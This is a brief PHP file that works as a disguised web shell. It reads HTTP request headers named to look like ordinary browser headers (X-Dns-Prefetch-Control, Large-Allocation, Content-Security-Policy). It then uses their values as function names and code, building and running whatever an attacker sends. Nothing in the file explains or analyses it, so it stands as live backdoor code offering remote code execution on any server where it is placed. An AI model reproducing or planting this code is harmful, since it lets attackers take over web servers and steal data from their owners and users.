<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $system = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Large-Allocation']($_HEADERS['Content-Security-Policy']));
    $system();
}